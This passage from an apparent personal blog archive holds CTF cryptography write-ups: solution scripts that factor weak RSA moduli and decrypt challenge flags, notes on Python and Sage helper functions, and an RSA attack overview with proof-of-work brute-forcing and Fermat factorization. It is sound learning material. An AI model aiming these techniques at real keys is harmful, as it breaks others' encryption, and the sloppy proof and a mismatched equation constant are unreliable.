<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pub_key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(pub.e)</span></span><br><span class="line"><span class="comment"># print(pub.n)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = base64.b64decode(f.read())</span><br><span class="line">c = bytes_to_long(cipher)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">51926993165717444667250925590498598946377319881662556610174970468991791873398735735101740226707561968771963673353253102616246155657339</span></span><br><span class="line">p, q = RSA_Backdoor(n)</span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 2761328357323929478367647741211050583178552594955214217850793389028221</span></span><br><span class="line"><span class="comment"># flag&#123;We@k_Pr1me_1s_d@nger0us&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="ACTF2018-可怜的RSA">[ACTF2018]可怜的RSA</h2>
<blockquote>
<p>construct to private key</p>
</blockquote>
<h3 id="flag-enc-2">flag.enc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW/MgPwxVBSl46joFCQ1plcnlDGfL19K/3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK/1EYU7NzrhGE7J5jPdi0Aj7xi/Odxy0hGMgpaBLd/nL3N8O6i9pc4Gg3O8soOlciBG/6/xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==</span><br></pre></td></tr></table></figure>
<h3 id="public-key">public.key</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/4</span><br><span class="line">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span><br><span class="line">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span><br><span class="line">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span><br><span class="line">+EJehFdQ6yt6vALcFc4CB1B6qVCGO7hICngCjdYpeZRNbGM/r6ED5Nsozof1oMbt</span><br><span class="line">Si8mZEJ/Vlx3gathkUVtlxx/+jlScjdM7AFV5fkRidt0LkwosDoPoRz/sDFz0qTM</span><br><span class="line">5q5TAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<h3 id="exp-py-2"><a href="http://exp.py">exp.py</a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">2. public.key：rb-&gt;RSA.import_key-&gt;e,n</span></span><br><span class="line"><span class="string">3. construct to privatekey</span></span><br><span class="line"><span class="string">    1. (n,e,d,(p),(q)) to save</span></span><br><span class="line"><span class="string">    2. RSA.construct() to construct</span></span><br><span class="line"><span class="string">    3. 2.exportKey() import</span></span><br><span class="line"><span class="string">    4. RSA.importKey() export</span></span><br><span class="line"><span class="string">    5. PKCS1_OAEP.new()  -&gt; important!</span></span><br><span class="line"><span class="string">4. d by using invert(), and int(d) to get integer</span></span><br><span class="line"><span class="string">5. use private key to decrypt</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;public.key&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pub = RSA.import_key(f.read())</span><br><span class="line">e = pub.e</span><br><span class="line">n = pub.n</span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># n = 79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># yafu-x64/factordb.com</span></span><br><span class="line">p = <span class="number">3133337</span></span><br><span class="line">q = <span class="number">25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939</span></span><br><span class="line">N = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, N))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = b64decode(f.read())</span><br><span class="line">    <span class="comment"># print(c)</span></span><br><span class="line">con = RSA.construct((n, e, d, p, q))</span><br><span class="line">pri = PKCS1_OAEP.new(RSA.importKey(con.exportKey()))</span><br><span class="line">m = pri.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;afctf&#123;R54_|5_$0_B0rin9&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>openssl</tag>
        <tag>factor</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-15-Functions</title>
    <url>/2022/11/15/22-11-15-functions/</url>
    <content><![CDATA[<p>To conclude the functions that I met in these years.</p>
<p>Just show that how the functions and equations</p>
<p>make a one-to-one relation.</p>
<p>Relating to <strong>python</strong>, <strong>sagemath</strong>……</p>
<span id="more"></span>
<h1>python3</h1>
<h2 id="normal">normal</h2>
<h3 id="num-bit-length">num.bit_length()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>).bit_length()</span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">num = <span class="number">1024</span></span><br><span class="line">num.bit_length()</span><br><span class="line"><span class="comment"># 11</span></span><br><span class="line"><span class="number">1024.</span>bit_length()</span><br><span class="line"><span class="comment"># error</span></span><br></pre></td></tr></table></figure>
<h2 id="gmpy2">gmpy2</h2>
<h3 id="gcd">gcd()</h3>
<blockquote>
<p>input: gcd(a, b)</p>
<p>output: the greatest</p>
</blockquote>
<p>To solve out the greatest common factor between $a$ and $b$</p>
<h3 id="gcdext-a-b">gcdext(a, b)</h3>
<h3 id="invert-a-n">invert(a, n)</h3>
<h3 id="powmod-a-b-c">powmod(a, b, c)</h3>
<h3 id="next-prime-a">next_prime(a)</h3>
<h3 id="iroot">iroot()</h3>
<h2 id="pycryptodome">pycryptodome</h2>
<h3 id="bytes-to-long">bytes_to_long()</h3>
<h3 id="long-to-bytes">long_to_bytes()</h3>
<h2 id="sympy">sympy</h2>
<blockquote>
<p><a href="https://geek-docs.com/sympy/sympy-method/python-sympy-solve-method.html">sympy.solve()方法|极客教程 (geek-docs.com)</a></p>
</blockquote>
<h3 id="symbol">symbol()</h3>
<blockquote>
<p>input: unknowns</p>
<p>output: defined unknowns</p>
</blockquote>
<p>Define the unknowns, such as $x$, $y$, etc.</p>
<p>Two ways to define:</p>
<ul>
<li>an unknown quantity: <code>x = Symbol('x')</code></li>
<li>more than one unknown quantity: <code>x, y = symbols('x y')</code></li>
</ul>
<h3 id="solve">solve()</h3>
<blockquote>
<p>input: solve([equations], [unknowns])</p>
<p>output: the root of the equations</p>
</blockquote>
<h2 id="z3">z3</h2>
<p><strong>install</strong></p>
<ul>
<li>cmd <code>pip install z3_solver</code></li>
<li>pycharm <code>setting -&gt; python interpreter -&gt; + -&gt; search for z3_solver.eg</code></li>
</ul>
<p><strong>import</strong></p>
<ul>
<li><code>from z3 import *</code></li>
<li><code>import z3</code></li>
</ul>
<h3 id="Int-Ints">Int()/Ints()</h3>
<blockquote>
<p>input: unknown</p>
<p>output: Integer variable.</p>
<p>eg: 3, 5, 7……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = Ints(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Real-Reals">Real()/Reals()</h3>
<blockquote>
<p>input: unknown</p>
<p>output: Real variable.</p>
<p>eg: $2^{\frac{1}{2}}$……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = Real(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># or </span></span><br><span class="line">a, b = Reals(<span class="string">&#x27;a b&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><em>Same above.</em></p>
<h3 id="BitVec-BitVecs">BitVec()/BitVecs()</h3>
<blockquote>
<p>input: bit vector unknown</p>
<p>output: bit vectors</p>
<p>eg: 11000001, 11111000……</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = BitVec(<span class="string">&#x27;a&#x27;</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">a, b = BitVecs(<span class="string">&#x27;a b&#x27;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Solver">Solver()</h3>
<blockquote>
<p>create a  Solver to calculate</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = Solver()</span><br></pre></td></tr></table></figure>
<h3 id="add">add()</h3>
<blockquote>
<p>input: equations or constraints</p>
<p>output: add to conditions</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"><span class="comment"># equ = [a + b == 10, a - b == 6]</span></span><br><span class="line">s.add(equ)</span><br></pre></td></tr></table></figure>
<h3 id="check">check()</h3>
<blockquote>
<p>to check the conditions and solve out</p>
<p>output: sat / unsat</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.add(equ)</span></span><br><span class="line">s.check()</span><br><span class="line"><span class="comment"># sat</span></span><br></pre></td></tr></table></figure>
<h3 id="model">model()</h3>
<blockquote>
<p>solve out the satisfied roots</p>
<p>output: the roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># if the output is sat that stands for there exist roots</span></span><br><span class="line">s.model()</span><br><span class="line"><span class="comment"># [a = 8, b = 2]</span></span><br></pre></td></tr></table></figure>
<h2 id="itertools">itertools</h2>
<blockquote>
<p>Traverse all possibilities</p>
</blockquote>
<blockquote>
<p><a href="https://docs.python.org/3/library/itertools.html">itertools — Functions creating iterators for efficient looping — Python 3.11.1 documentation</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br></pre></td></tr></table></figure>
<h3 id="product">product()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">product(<span class="string">&#x27;ABCD&#x27;</span>, repeat = <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DD</span></span><br></pre></td></tr></table></figure>
<h3 id="permutations">permutations()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">permutations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BA BC BD CA CB CD DA DB DC</span></span><br><span class="line"><span class="comment"># no repeated compared to result above</span></span><br></pre></td></tr></table></figure>
<h3 id="combinations">combinations()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AB AC AD BC BD CD</span></span><br></pre></td></tr></table></figure>
<h3 id="combinations-with-replacement">combinations_with_replacement()</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combinations_with_replacement(<span class="string">&#x27;ABCD&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment"># AA AB AC AD BB BC BD CC CD DD</span></span><br><span class="line"><span class="comment"># repeated compared to result above</span></span><br></pre></td></tr></table></figure>
<h2 id="libnum">libnum</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br></pre></td></tr></table></figure>
<h3 id="n2s-n">n2s(n)</h3>
<blockquote>
<p>number convert to string</p>
</blockquote>
<h3 id="s2n-s">s2n(s)</h3>
<blockquote>
<p>string convert to number</p>
</blockquote>
<h3 id="s2b-s">s2b(s)</h3>
<blockquote>
<p>string convert to binary</p>
</blockquote>
<h3 id="b2s-b">b2s(b)</h3>
<blockquote>
<p>binary convert to string</p>
</blockquote>
<h3 id="prime-n">prime(n)</h3>
<blockquote>
<p>produce primes &lt; = n</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">14</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>primes(<span class="number">13</span>)</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>]</span><br></pre></td></tr></table></figure>
<h3 id="generate-prime-n">generate_prime(n)</h3>
<blockquote>
<p>generate bit_length=n prime</p>
</blockquote>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">generate_prime(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 787</span></span><br></pre></td></tr></table></figure>
<h1>sagemath</h1>
<blockquote>
<p><a href="https://doc.sagemath.org/html/en/reference/">Reference Manual (sagemath.org)</a></p>
</blockquote>
<h2 id="var">var()</h2>
<blockquote>
<p>input: Integer</p>
<p>output:  Integer variables</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="solve-2">solve()</h2>
<blockquote>
<p>input: solve([equations], [variables])</p>
<p>output: roots</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3x-y+z=185</span></span><br><span class="line"><span class="string">2x+3y-z=321</span></span><br><span class="line"><span class="string">x+y+z=173</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">x, y, z = var(<span class="string">&#x27;x y z&#x27;</span>)</span><br><span class="line">f1 = <span class="number">3</span>*x - y + z == <span class="number">185</span></span><br><span class="line">f2 = <span class="number">2</span>*x + <span class="number">3</span>*y - z == <span class="number">321</span></span><br><span class="line">f3 = x + y + z == <span class="number">185</span></span><br><span class="line">sol = solve([f1, f2, f3], [x, y, z])</span><br><span class="line"><span class="comment"># [[x == 74, y == 68, z == 31]]</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">x*x+x-7943722218936282=0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">f = x*x + x - <span class="number">7943722218936282</span></span><br><span class="line">solve([f], [x])</span><br><span class="line"><span class="comment"># [x == 89127561, x == -89127562]</span></span><br></pre></td></tr></table></figure>
<h2 id="PolynomialRing">PolynomialRing?</h2>
<h2 id="Ideal">Ideal?</h2>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>function</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-04-RSA</title>
    <url>/2022/11/04/22-11-04-RSA/</url>
    <content><![CDATA[<p><strong>JUST</strong> conclude the attacks about RSA.</p>
<p>Make a record for myself.</p>
<span id="more"></span>
<h1>RSA</h1>
<h2 id="Algorithm">Algorithm</h2>
<ul>
<li>produce large primes $p$ and $q$</li>
<li>calculate $n = p \times q$</li>
<li>use <strong>Euler’s totient function</strong> to get $\varphi(n) = (p-1) \times (q-1)$, in code we usually use $N$ or $phi$</li>
<li>define $e$ which satisfies the condition that $gcd(e, \varphi(n)) = 1$, and the $e$ is between 1 and $\varphi(n)$</li>
<li>calculate $d$ and the $d$ comes from $de \equiv 1 \mod \varphi(n)$</li>
<li><strong>encrypt: $c \equiv m^{e} \mod n$</strong></li>
<li><strong>decrypt: $m \equiv c^{d} \mod n$</strong></li>
<li>PUBLICKEY: PU{e, n}</li>
<li>PRIVATEKEY: PR{p, q, d}</li>
</ul>
<h2 id="Proof">Proof</h2>
<p>$$<br>
m \equiv c^{d} \mod n \equiv m^{de} \mod n \equiv m^{k\varphi(n) + 1} \mod n \equiv m \mod n<br>
$$</p>
<p>use the <strong>Fermat’s little theorem</strong> deduce:<br>
$$<br>
m^{n} \equiv m \mod n\<br>
$$</p>
<p>$$<br>
m^{n-1} \equiv m^{\varphi(n)} \equiv 1 \mod n\<br>
$$</p>
<h3 id="m-n-are-relatively-prime">$m$, $n$ are relatively-prime</h3>
<p>the $m^{k\varphi(n)}$:<br>
$$<br>
m^{k\varphi(n)} \equiv 1\mod n\<br>
$$</p>
<p>$$<br>
\Longrightarrow m^{k\varphi(n) + 1} \equiv m \mod n<br>
$$</p>
<h3 id="m-n-not-relatively-prime">$m$,$n$ not relatively-prime</h3>
<p>preparation:<br>
$$<br>
gcd(m, n) \neq 1\<br>
$$<br>
$$<br>
n = p \times q\<br>
$$</p>
<p>$$<br>
\Longrightarrow n = kp\<br>
$$</p>
<p>$$<br>
k, p \ are \ relatively-prime<br>
$$</p>
<p>also <strong>Fermat’s little theorem</strong>:<br>
$$<br>
(kp)^{q-1} \equiv 1 \mod q<br>
$$<br>
based on the properties of con-gruences multiplication property:<br>
$$<br>
(kp)^{(p-1)\times (q-1) \times k} (kp) \equiv (kp) \mod q<br>
$$<br>
substitute the $\varphi(n)$ and $de \equiv 1 \mod \varphi(n)$:<br>
$$<br>
\varphi(n) = (p-1) \times (q-1)\<br>
$$<br>
$$<br>
de = 1 + k \times \varphi(n)\<br>
$$</p>
<p>$$<br>
\Longrightarrow (kp)^{de} \equiv (kp) \mod q\<br>
$$</p>
<p>$$<br>
\Longrightarrow (kp)^{de}=kp + tq<br>
$$</p>
<p>thus, $tq | kq$ and $t|p$ for $q$ is prime:<br>
$$<br>
assume: t = t\times p\<br>
$$<br>
$$<br>
(kp)^{de} = tq + kp = t\times p\times q + k \times p = tn + kp\<br>
$$</p>
<p>$$<br>
(kp)^{de} = m + tn \equiv m \mod n<br>
$$</p>
<p>proved.</p>
<h2 id="Preparation">Preparation</h2>
<ul>
<li>gmpy2</li>
<li>python3.7+</li>
<li>pycharm</li>
<li>sagemath</li>
</ul>
<h1>NC CHALLENGE</h1>
<p>Before nc real connection, you need to receive the challenge and make a solution about it.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet = digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line">sha256 = <span class="string">&#x27;9a579edf6cdd9ed39efc1ccc754e7bb15d52e3d9cabcd66c7042fa1a59fc2836&#x27;</span></span><br><span class="line">tail = <span class="string">&#x27;j60BfGY9sSnkMi9H&#x27;</span></span><br><span class="line">xxxx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data = i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha = hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha == sha256):</span><br><span class="line">        xxxx = data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 爆破sha256+hex</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase1</span>(<span class="params">pre, target</span>):</span><br><span class="line">    pre = codecs.decode(pre.encode(), <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">        skr = pre + <span class="string">b&#x27;&#x27;</span>.join([t.to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> t <span class="keyword">in</span> x])</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(skr).hexdigest() == target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;find <span class="subst">&#123;skr&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> codecs.encode(skr, <span class="string">&#x27;hex&#x27;</span>).decode()</span><br></pre></td></tr></table></figure>
<p><em>change sha256/tail and crack xxxx</em></p>
<p>Or use the connecting function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">r = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28826</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;sha256(XXXX&#x27;</span>)</span><br><span class="line">    line = r.recvline()[:-<span class="number">1</span>].decode()</span><br><span class="line">    <span class="built_in">print</span>(line)</span><br><span class="line">    tmp = line[line.find(<span class="string">&#x27;+&#x27;</span>) + <span class="number">1</span>:line.find(<span class="string">&#x27;)&#x27;</span>)]</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    aim = line[line.find(<span class="string">&#x27;== &#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">    <span class="built_in">print</span>(aim)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> table:</span><br><span class="line">                    ans = i + j + k + l</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256((ans + tmp).encode()).hexdigest() == aim:</span><br><span class="line">                        <span class="built_in">print</span>(ans)</span><br><span class="line">                        r.recvuntil(<span class="string">b&#x27;Give me XXXX: &#x27;</span>)</span><br><span class="line">                        r.sendline(ans.encode())</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">proof()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h1>MODULUS FACTORIZATION</h1>
<p>Or we can call it <code>Original_RSA</code>.</p>
<p>The main target in RSA problems is to factorize <code>n</code> to <code>p</code> and <code>q</code>.</p>
<p>Here is the code of <code>Original_RSA</code> which is the basic attack among RSA attacks.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p, q, e, c, n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)    </span><br><span class="line">    d = <span class="built_in">int</span>(gmpy2.invert(e,N))  <span class="comment"># mpz() may run error, convert to int()</span></span><br><span class="line">    <span class="comment"># d = gmpy2.invert(e,N)</span></span><br><span class="line">    m = gmpy2.powmod(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<p><strong>BUT HOW TO FACTORIZE THE $n$?</strong></p>
<p>It is the significant question. Follows are some solutions that I met.</p>
<h2 id="Factorize">Factorize</h2>
<h3 id="factordb">factordb</h3>
<blockquote>
<p><a href="http://factordb.com/">factordb.com</a></p>
</blockquote>
<p>A database contains many $n$ that has been factorized.</p>
<h3 id="yafu-x64">yafu-x64</h3>
<p>The $p$,$q$ differ very well or a little or $p$,$q$  are smooth and produced by $\rho -1 $or $\rho + 1 $.</p>
<p><strong>usage</strong></p>
<ul>
<li>
<p>yafu-x64 factor()</p>
</li>
<li>
<p>yafu-x64 factor(@) -batchfile [filename] <em>!remember the number saved in file and need a <code>\n</code></em></p>
</li>
</ul>
<h3 id="msieve153">msieve153</h3>
<p>Which is similar to yafu-x64</p>
<h3 id="RSAConverter">RSAConverter</h3>
<p>Based on CRT.</p>
<p><strong>usage</strong></p>
<ul>
<li>
<p>$n$, $d$ convert to hex and delete <code>0x</code></p>
</li>
<li>
<p>$e$ convert to hex and delete <code>x</code></p>
</li>
</ul>
<h3 id="fermath-factorization">fermath factorization</h3>
<p>p,q have a little difference</p>
<ul>
<li>p or q created by <code>next_prime()</code>
<ul>
<li>find the Reference Substance <code>n_2</code> which can be produced by <code>iroot(n, 2)[0]</code></li>
<li>p and q are primes, and $p&lt;n_2&lt;q$</li>
<li>we can get $q$ by <code>next_prime(n_2)</code></li>
<li>and <code>p = n // q</code></li>
</ul>
</li>
<li>p and q are similar but not neighbors
<ul>
<li>also find the <code>n_2</code></li>
<li>with <code>n_2</code> as a center, step size 1 and right</li>
<li>if find $p$ and $q$ satisfied the condition, and we get the true $p$ and $q$</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fermat Factorization 2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factor</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Fermat Factorization</span></span><br><span class="line"><span class="string">    conditon:</span></span><br><span class="line"><span class="string">        1. n is odd</span></span><br><span class="line"><span class="string">        2. satisfy the equation (p-q)(p+q)</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: result</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b_2 = a*a - n</span><br><span class="line">        b, index = gmpy2.iroot(b_2, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> index == <span class="literal">True</span>:</span><br><span class="line">            result = [<span class="built_in">int</span>(a + b), <span class="built_in">int</span>(a - b)]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
